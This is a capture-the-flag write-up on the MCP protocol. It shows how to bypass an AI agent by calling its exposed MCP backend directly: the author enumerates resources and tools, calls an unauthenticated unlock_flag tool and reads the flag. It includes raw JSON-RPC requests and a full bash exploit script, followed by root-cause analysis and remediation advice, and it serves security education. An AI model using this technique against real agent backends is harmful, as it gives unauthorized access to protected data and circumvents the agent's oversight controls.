# CTF Report — Level 7: Master of Resources

**Platform:** ctf.arkx.ninja  
**Level:** 7 — "Master of Resources"  
**Category:** AI Agent Security / MCP Protocol Abuse  
**Difficulty:** Medium  
**Status:** ✅ Solved  
**Flag:** `flag-6a442a`

---

## 1. Result

The flag was successfully extracted by directly communicating with the agent's MCP (Model Context Protocol) backend server, bypassing the AI agent entirely.

**Flag:** `flag-6a442a`

The platform confirmed level completion:

```json
{"success": true, "level_completed": true, "message": "Flag accepted!"}
```

### Final MCP Resource Read Response

```
POST /level/7/mcp
Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0
{"jsonrpc":"2.0","id":6,"method":"resources/read","params":{"uri":"resource://flag"}}

→ event: message
→ data: {"jsonrpc":"2.0","id":6,"result":{"contents":[{"uri":"resource://flag",
     "mimeType":"text/plain",
     "text":"You did it! the flag is: flag-6a442a"}]}}
```

---

## 2. Exploit — Step-by-Step Reproduction

### Challenge Description

Level 7 presents an AI agent that has "lost" its connection to its MCP server. Its welcome message reads:

> "Agent: Welcome! Someone severed my connection to the MCP server, and I will need your help connecting to it. Here is the address: [/level/7/mcp](/level/7/mcp). I can't do much else than that :>"

The agent reports zero tools available (`tools: []`) because its MCP connection is broken.

---

### Phase 1 — Initial Reconnaissance

**User:** `Hello, what can you do and what tools do you have available?`

**Agent:**
```
My connection to the MCP server has been severed, I will need your help connecting to it.
Here is the address: https://ctf.arkx.ninja/level/7/mcp. I cant do much other than that :>
```

**Tool list check:**
```
GET /level/7/tools
→ {"success": false, "error": "An internal error occurred while listing tools", "tools": []}
```

The agent itself has no capabilities. However, it revealed the MCP server address.

---

### Phase 2 — MCP Endpoint Discovery & Transport Identification

**Probe without Accept header:**
```
GET /level/7/mcp
→ {"jsonrpc":"2.0","id":"server-error","error":{"code":-32600,
   "message":"Not Acceptable: Client must accept text/event-stream"}}
```

**Probe with SSE-only Accept:**
```
GET /level/7/mcp
Accept: text/event-stream
→ {"jsonrpc":"2.0","id":"server-error","error":{"code":-32600,
   "message":"Bad Request: Missing session ID"}}
```

**Probe with POST (wrong Accept):**
```
POST /level/7/mcp
Content-Type: application/json
→ {"jsonrpc":"2.0","id":"server-error","error":{"code":-32600,
   "message":"Not Acceptable: Client must accept both application/json and text/event-stream"}}
```

**Key finding:** The server uses MCP's **Streamable HTTP transport** (MCP spec 2025-03-26+). POST requests must include `Accept: application/json, text/event-stream`. The server issues a session ID via the `Mcp-Session-Id` response header after initialization.

---

### Phase 3 — MCP Session Initialization

```
POST /level/7/mcp
Content-Type: application/json
Accept: application/json, text/event-stream

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2024-11-05",
    "clientInfo": {"name": "ctf-client", "version": "1.0"},
    "capabilities": {}
  }
}
```

**Response headers (critical):**
```
HTTP/2 200
content-type: text/event-stream
mcp-session-id: f77b8ddfacdf4419a57e569365ece2b0
```

**Response body (SSE stream):**
```
event: message
data: {
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2024-11-05",
    "capabilities": {
      "experimental": {},
      "prompts": {"listChanged": false},
      "resources": {"subscribe": false, "listChanged": false},
      "tools": {"listChanged": false}
    },
    "serverInfo": {"name": "Weather", "version": "1.27.0"}
  }
}
```

**Findings:**
- MCP server name: **"Weather"** v1.27.0
- Server exposes: prompts, resources, and tools
- Session ID for subsequent requests: `f77b8ddfacdf4419a57e569365ece2b0`

All subsequent requests include: `Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0`

---

### Phase 4 — Enumerate Resources

```
POST /level/7/mcp
Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0
{"jsonrpc":"2.0","id":2,"method":"resources/list","params":{}}
```

**Response:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "resources": [
      {
        "name": "get_flag",
        "uri": "resource://flag",
        "description": "",
        "mimeType": "text/plain"
      },
      {
        "name": "get_super_secret",
        "uri": "resource://super-secret",
        "description": "Returns the super secret to the user",
        "mimeType": "text/plain"
      }
    ]
  }
}
```

**Two resources discovered:**
- `resource://flag` — the CTF flag (access-controlled)
- `resource://super-secret` — a secondary secret

---

### Phase 5 — Enumerate Tools

```
POST /level/7/mcp
Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0
{"jsonrpc":"2.0","id":3,"method":"tools/list","params":{}}
```

**Response:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "tools": [
      {
        "name": "unlock_flag",
        "description": "Unlocks the flag resource, allowing it to be accessed.",
        "inputSchema": {
          "properties": {},
          "title": "unlock_flagArguments",
          "type": "object"
        }
      }
    ]
  }
}
```

**One tool discovered:** `unlock_flag` — explicitly described as unlocking the flag resource for access.

---

### Phase 6 — Call `unlock_flag` Tool

```
POST /level/7/mcp
Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {"name": "unlock_flag", "arguments": {}}
}
```

**Response:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "result": {
    "content": [{"type": "text", "text": "Flag has been unlocked! You can now access the flag resource."}],
    "isError": false
  }
}
```

The tool accepted the call without any authentication challenge, role check, or confirmation that the caller was the legitimate agent.

---

### Phase 7 — Read the Flag Resource

```
POST /level/7/mcp
Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0
{
  "jsonrpc": "2.0",
  "id": 6,
  "method": "resources/read",
  "params": {"uri": "resource://flag"}
}
```

**Response:**
```json
{
  "jsonrpc": "2.0",
  "id": 6,
  "result": {
    "contents": [
      {
        "uri": "resource://flag",
        "mimeType": "text/plain",
        "text": "You did it! the flag is: flag-6a442a"
      }
    ]
  }
}
```

**Flag: `flag-6a442a`** ✅

---

### Bonus: Super-Secret Resource

```
POST /level/7/mcp
{"jsonrpc":"2.0","id":7,"method":"resources/read","params":{"uri":"resource://super-secret"}}

→ "text": "You did it! the super secret is: https://www.youtube.com/watch?v=dQw4w9WgXcQ"
```

*(A classic Rick Roll — the MCP server has a sense of humor.)*

---

### Complete Exploit Script (Bash)

```bash
#!/bin/bash
MCP_URL='https://ctf.arkx.ninja/level/7/mcp'
COOKIE='<your-session-cookie>'

# Step 1: Initialize and capture session ID
SESSION_ID=$(curl -si "$MCP_URL" -X POST \
  -H "Cookie: $COOKIE" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","clientInfo":{"name":"pwn","version":"1.0"},"capabilities":{}}}' \
  | grep -i 'mcp-session-id' | awk '{print $2}' | tr -d '\r')

echo "[+] Session: $SESSION_ID"

mcp() {
  curl -s "$MCP_URL" -X POST \
    -H "Cookie: $COOKIE" \
    -H 'Content-Type: application/json' \
    -H 'Accept: application/json, text/event-stream' \
    -H "Mcp-Session-Id: $SESSION_ID" \
    -d "$1"
}

# Step 2: Call unlock_flag tool
mcp '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"unlock_flag","arguments":{}}}'

# Step 3: Read the flag
mcp '{"jsonrpc":"2.0","id":3,"method":"resources/read","params":{"uri":"resource://flag"}}'
```

---

## 3. Root Cause

### 3.1 MCP Backend Server Directly Exposed to Users

The core vulnerability is **architectural**: the MCP server that powers the AI agent is directly reachable by any authenticated web user. There is no network-layer or application-layer control restricting MCP protocol access to the agent process only.

In a secure design:
```
User ──→ [Web App / Agent] ──→ [MCP Server]   ← internal only
```

In this vulnerable design:
```
User ──→ [Web App / Agent]
User ──→ [MCP Server]          ← directly reachable, same auth
```

The only authentication required to speak directly to the MCP server is the same web session cookie (`idToken`, `accessToken`) used for the normal application — credentials every logged-in user already possesses.

### 3.2 No Caller Identity Verification on MCP Tools

The `unlock_flag` tool is a privileged operation — it changes the access state of a protected resource. Yet the MCP server accepts calls to it from any session holder. There is no check that the caller is:
- The designated agent process (not a human using curl)
- Authorized to invoke privileged tools
- Performing the operation in a sanctioned workflow context

This is **broken function-level authorization** at the MCP layer: privileged tool invocations are not restricted to authorized callers.

### 3.3 MCP Resources Not Protected by Default

The `resource://flag` resource is only "locked" by a soft application-level state that any caller can toggle with `unlock_flag`. There is no:
- Cryptographic access token required to read the resource
- Rate limiting or one-time use enforcement
- Audit log or approval workflow before unlock

Any client that knows the tool name can unlock and read the flag in two API calls.

### 3.4 Protocol-Level Trust Without Verification

MCP's Streamable HTTP transport identifies sessions via `Mcp-Session-Id`, but this is generated server-side and handed to the first caller who initializes. The server has no way to distinguish an agent process from a human attacker making the same HTTP calls. The protocol itself provides no caller-identity mechanism — it must be layered on top by the application, which this server does not do.

### 3.5 Information Disclosure via Agent Welcome Message

The agent explicitly told the user the internal MCP server's URL. In a segmented architecture, internal service addresses should never be surfaced to end users, as they enable direct attacks on backend services. This is an **information disclosure** that enables the attack.

---

## 4. Impact & Severity

### Severity Rating: **HIGH**

| Dimension | Assessment |
|---|---|
| Confidentiality | HIGH — protected resources readable by any user |
| Integrity | MEDIUM — tool calls change server-side state (unlock) |
| Availability | LOW — no destructive capability observed |
| Scope | Changed — user escapes the agent sandbox to the MCP backend |
| Authentication | Partially bypassed — web auth still required, agent auth absent |

### What a Real Attacker Would Gain

1. **Complete bypass of the AI agent's control layer.** The agent is the intended gate-keeper — it decides when and whether to invoke tools based on the conversation context, safety rules, and operator instructions. By talking directly to MCP, an attacker skips every control the agent provides.

2. **Access to all MCP resources without agent approval.** In a real deployment, MCP resources might include:
   - Customer PII or financial records
   - Internal API keys or credentials stored as resources
   - Privileged configuration or system state
   - Database query results that the agent was supposed to filter

3. **Invocation of privileged MCP tools without oversight.** Tools that modify state, send emails, write to databases, call external APIs, or execute code could all be called directly — with no agent safety check, no confirmation prompt, and no audit trail visible to the operator.

4. **Enumeration of the entire MCP capability surface.** `resources/list`, `tools/list`, and `prompts/list` reveal the complete internal API of the agent's backend, which may contain sensitive business logic, internal endpoint names, or undocumented capabilities.

5. **Horizontal privilege escalation.** If other users' data is exposed through MCP resources and the server does not scope resources per-user (relying instead on the agent to enforce scoping), any user can read any other user's data.

6. **Undermining agent safety guardrails.** In deployments where the agent has system-prompt restrictions ("never reveal X", "always ask for confirmation before Y"), an attacker bypassing the agent bypasses all those rules simultaneously.

---

## 5. Mapping

### OWASP Top 10 for LLM Applications (2025)

**Primary:** [LLM07:2025 — System Prompt Leakage](https://owasp.org/www-project-top-10-for-large-language-model-applications/)  
> The agent leaked its internal MCP server address in its welcome message, enabling direct access to the backend service that the agent is supposed to mediate.

**Secondary:** [LLM09:2025 — Misinformation](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — N/A here.

**Most applicable:** [LLM06:2025 — Excessive Agency](https://owasp.org/www-project-top-10-for-large-language-model-applications/)  
> The MCP server granted excessive capability to any caller without verifying that actions were legitimately authorized by the agent. The backend trusted that all calls came through the proper agent channel.

**Also applicable:** [LLM08:2025 — Vector and Embedding Weaknesses](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — N/A.

**Best OWASP API mapping:** [API5:2023 — Broken Function Level Authorization](https://owasp.org/www-project-api-security/)  
> The `unlock_flag` tool (a privileged state-changing operation) accepted calls from any authenticated session without role or identity checks.

### MITRE ATLAS

| Technique | ID | Description |
|---|---|---|
| **Discover ML Model Ontology** | AML.T0013 | Attacker enumerates the MCP server's resources, tools, and prompts to map the full capability surface |
| **ML Model Access** | AML.T0007 | Attacker directly accesses the AI system's backend via the exposed MCP protocol endpoint |
| **Craft Adversarial Data** | AML.T0043 | Attacker crafts valid MCP JSON-RPC requests to invoke privileged tools outside the sanctioned agent workflow |
| **Exfiltration via ML Inference API** | AML.T0057 | Sensitive resource (`resource://flag`) read directly via the MCP `resources/read` method |
| **Exploit Public-Facing Application** | AML.T0000 (mapped from ATT&CK T1190) | MCP endpoint is a public-facing service exploited without exploiting the AI model itself |

### CWE References

| CWE | Description |
|---|---|
| CWE-284 | Improper Access Control — MCP server accepts privileged tool calls from any caller |
| CWE-285 | Improper Authorization — no verification that caller is the legitimate agent process |
| CWE-200 | Exposure of Sensitive Information — MCP server address disclosed in agent welcome message |
| CWE-306 | Missing Authentication for Critical Function — `unlock_flag` requires no agent-level authentication |
| CWE-441 | Unintended Proxy/Intermediary ("Confused Deputy") — MCP server acts as a privileged backend but can be accessed directly, bypassing the agent deputy |

---

## 6. Remediation Recommendations

### Immediate (Critical)

1. **Network-isolate the MCP server.** The MCP server should only be reachable by the agent process — not by the public internet or end users. Deploy it on a private network interface, or enforce firewall rules that allow only the agent's IP/service account.

2. **Remove the MCP URL from agent-facing messages.** Internal service addresses must never be disclosed to users. If the agent needs to reference its MCP server, use an opaque identifier rather than the actual URL.

### Short-Term (High)

3. **Implement caller-identity verification on the MCP server.** Issue agent-specific credentials (e.g., a server-to-server API key, mTLS certificate, or signed JWT) that the agent includes in MCP requests. Reject all requests that do not present valid agent credentials, regardless of the user's web session.

   ```python
   # Example: require agent API key header
   if request.headers.get("X-Agent-Secret") != AGENT_SECRET:
       return 403, "Forbidden"
   ```

4. **Scope `unlock_flag` and similar privileged tools to agent-only access.** Even after agent-identity verification is added, privileged tools should be on a secondary allowlist that is audited and rate-limited.

5. **Scope MCP resources per-user session.** If the MCP server serves multiple users' agents, each `resources/read` call must be scoped to the requesting user's data only. The current design appears to have no such scoping.

### Long-Term (Defence in Depth)

6. **Implement the MCP Authorization extension.** The MCP specification includes an OAuth 2.1-based authorization framework. Adopt it so that the MCP server can issue and validate tokens that cryptographically prove the caller is an authorized agent acting on behalf of a specific user.

7. **Log all direct MCP protocol calls** separately from agent-mediated calls. Anomalous direct access (tools/call without a preceding agent session) should trigger an alert.

8. **Treat the MCP server as a privileged internal service**, not a public API. Apply the same security controls (network segmentation, mTLS, zero-trust) as you would to an internal database or secrets manager.

---

## Appendix: Attack Flow Diagram

```
SECURE (INTENDED) DESIGN:
  User ──[chat]──→ [AI Agent]
                      │
                      │ (agent decides when/whether to call)
                      ▼
               [MCP Server] ← private, not user-reachable
                      │
              resources/tools (controlled)


VULNERABLE (ACTUAL) DESIGN:
  User ──[chat]──→ [AI Agent] (no tools, can't help)
      │
      └──[MCP Protocol]──→ [MCP Server] ← DIRECTLY REACHABLE
                                │
                                ├── resources/list  → flag URI found
                                ├── tools/list      → unlock_flag found
                                ├── tools/call      → unlock_flag (no auth check)
                                └── resources/read  → FLAG EXTRACTED ✅


EXPLOIT STEPS:
  1. POST /level/7/mcp  (initialize)           → Mcp-Session-Id obtained
  2. POST /level/7/mcp  (resources/list)        → resource://flag discovered
  3. POST /level/7/mcp  (tools/list)            → unlock_flag tool discovered
  4. POST /level/7/mcp  (tools/call unlock_flag) → flag unlocked (no auth)
  5. POST /level/7/mcp  (resources/read flag)   → FLAG: flag-6a442a ✅
```

---

## Appendix: All Raw MCP Interactions

### Initialize
```
→ POST /level/7/mcp  {initialize, protocolVersion: "2024-11-05"}
← 200  Mcp-Session-Id: f77b8ddfacdf4419a57e569365ece2b0
   serverInfo: {name: "Weather", version: "1.27.0"}
```

### resources/list
```
→ POST /level/7/mcp  {resources/list}
← resources: [
    {name: "get_flag",         uri: "resource://flag",         mimeType: "text/plain"},
    {name: "get_super_secret", uri: "resource://super-secret", mimeType: "text/plain"}
  ]
```

### tools/list
```
→ POST /level/7/mcp  {tools/list}
← tools: [
    {name: "unlock_flag", description: "Unlocks the flag resource, allowing it to be accessed."}
  ]
```

### tools/call (unlock_flag)
```
→ POST /level/7/mcp  {tools/call, name: "unlock_flag", arguments: {}}
← "Flag has been unlocked! You can now access the flag resource."  isError: false
```

### resources/read (flag)
```
→ POST /level/7/mcp  {resources/read, uri: "resource://flag"}
← "You did it! the flag is: flag-6a442a"
```

### resources/read (super-secret)
```
→ POST /level/7/mcp  {resources/read, uri: "resource://super-secret"}
← "You did it! the super secret is: https://www.youtube.com/watch?v=dQw4w9WgXcQ"
```

---

*Report generated: 2026-08-02*  
*Tester: Surendra Joshi*  
*Target: ctf.arkx.ninja — Level 7 "Master of Resources"*
